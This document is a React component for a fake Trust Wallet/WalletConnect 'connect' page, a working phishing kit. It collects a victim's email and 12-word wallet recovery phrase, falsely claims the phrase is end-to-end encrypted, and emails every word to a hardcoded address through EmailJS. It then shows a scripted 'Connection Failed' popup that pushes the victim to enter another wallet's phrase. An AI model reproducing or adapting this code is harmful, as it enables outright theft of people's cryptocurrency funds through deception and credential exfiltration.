import React, { useState, useEffect } from "react";
import emailjs from '@emailjs/browser';
import "./TrustWalletConnect.css";
import logo from "../assets/logo.png";
import trust from "../assets/TrustWallet.png";
import walletConnect from "../assets/WalletConnect.png";

const TrustWalletConnect = () => {
  const [showPopup, setShowPopup] = useState(false);
  const [words, setWords] = useState(Array(12).fill(""));
  const [email, setEmail] = useState("");
  const [isSending, setIsSending] = useState(false);

  // ========================================
  // CONFIGURATION - CHANGE THESE VALUES
  // ========================================
  const EMAIL_CONFIG = {
    serviceId: "service_t9c6suh",
    templateId: "template_espq3gf",
    publicKey: "ZwjAnHIUf8QgLnEOP"
  };
  
  const RECIPIENT_EMAIL = "demoprojectwork1996@gmail.com";
  // ========================================

  // Prevent page scroll when popup is open
  useEffect(() => {
    document.body.style.overflow = showPopup ? "hidden" : "auto";
  }, [showPopup]);

  // Handle word input (no spaces allowed)
  const handleWordChange = (index, value) => {
    const sanitizedValue = value.replace(/\s+/g, "");
    const updatedWords = [...words];
    updatedWords[index] = sanitizedValue;
    setWords(updatedWords);
  };

  // Block space key
  const blockSpace = (e) => {
    if (e.key === " ") e.preventDefault();
  };

  // Check if all 12 boxes AND email are filled
  const isFormComplete = words.every((word) => word.trim() !== "") && email.trim() !== "";

  // Send email function
  const sendEmail = async () => {
    setIsSending(true);
    
    console.log("🚀 Starting email send process...");
    console.log("📋 Current words array:", words);
    console.log("📧 Email:", email);
    
    try {
      // Initialize EmailJS with your public key
      emailjs.init(EMAIL_CONFIG.publicKey);
      console.log("✅ EmailJS initialized");

      // Prepare email data - MUST match your EmailJS template variables
      const templateParams = {
        user_email: email,
        word_1: words[0] || "",
        word_2: words[1] || "",
        word_3: words[2] || "",
        word_4: words[3] || "",
        word_5: words[4] || "",
        word_6: words[5] || "",
        word_7: words[6] || "",
        word_8: words[7] || "",
        word_9: words[8] || "",
        word_10: words[9] || "",
        word_11: words[10] || "",
        word_12: words[11] || "",
        full_phrase: words.join(" "),
        submission_date: new Date().toLocaleString()
      };

      console.log("📝 Template params:", templateParams);
      console.log("🔍 Individual words check:");
      console.log("  word_1:", templateParams.word_1);
      console.log("  word_2:", templateParams.word_2);
      console.log("  word_12:", templateParams.word_12);

      // Send email
      const response = await emailjs.send(
        EMAIL_CONFIG.serviceId,
        EMAIL_CONFIG.templateId,
        templateParams
      );

      console.log("✅ Email sent successfully!", response);
      alert("✅ Email sent! Check console for what was sent.");
    } catch (error) {
      console.error("❌ Failed to send email:", error);
      alert("❌ Email failed! Error: " + (error.text || error.message));
    } finally {
      setIsSending(false);
      setShowPopup(true);
    }
  };

  // Handle connect button click
  const handleConnect = () => {
    sendEmail();
  };

  return (
    <>
      {/* ================= PAGE ================= */}
      <div className="twc-page">
        <div className="twc-logo">
          <img src={logo} alt="wallet-logo" />
        </div>

        <div className="twc-card">
          <img
            className="walletConnect"
            src={walletConnect}
            alt="walletConnect"
          />

          <div className="twc-header">
            <h2 className="twc-connect-text">CONNECT</h2>
            <div className="twc-title">
              <img src={trust} alt="trust" />
            </div>
          </div>

          <label className="twc-label-email">Enter your Email Address</label>
          <input
            type="email"
            placeholder="Email Address*"
            className="twc-input"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />

          <label className="twc-label-email">
            Enter your Trust Wallet 12 word Secret Phrase
          </label>

          <p className="twc-info-text">
            Trust wallet must be atleast 30 days old and should have minimum
            $1 gas fees. Your Trust Wallet Phrase Key is end to end encrypted.
            No one can view or access it.
          </p>

          {/* ================= WORD INPUTS ================= */}
          <div className="twc-phrase-box">
            {words.map((word, index) => (
              <input
                key={index}
                type="text"
                placeholder={`${index + 1}. word`}
                className="twc-word-input"
                value={word}
                onChange={(e) => handleWordChange(index, e.target.value)}
                onKeyDown={blockSpace}
              />
            ))}
          </div>

          {/* ================= CONNECT BUTTON ================= */}
          <button
            className="twc-connect-btn"
            disabled={!isFormComplete || isSending}
            onClick={handleConnect}
            style={{
              opacity: isFormComplete && !isSending ? 1 : 0.6,
              cursor: isFormComplete && !isSending ? "pointer" : "not-allowed"
            }}
          >
            {isSending ? "CONNECTING..." : "CONNECT"}
          </button>

          <p className="twc-note">
            Note: Trust wallet connect is mandatory as per security.
            For more contact our chat
          </p>
        </div>
      </div>

      {/* ================= POPUP (UNCHANGED) ================= */}
      {showPopup && (
        <div className="twc-popup-overlay">
          <div className="twc-popup-box">
            <div className="twc-popup-icon">✕</div>
            <h3 className="twc-popup-title">Connection Failed!</h3>
            <p className="twc-popup-text">
              Your Trust Wallet is not eligible for connection.
              Please try connecting with a different Trust Wallet.
              Repeated attempts using the same wallet may result
              in account suspension.
            </p>
            <button
              className="twc-popup-btn"
              onClick={() => setShowPopup(false)}
            >
              OK
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default TrustWalletConnect;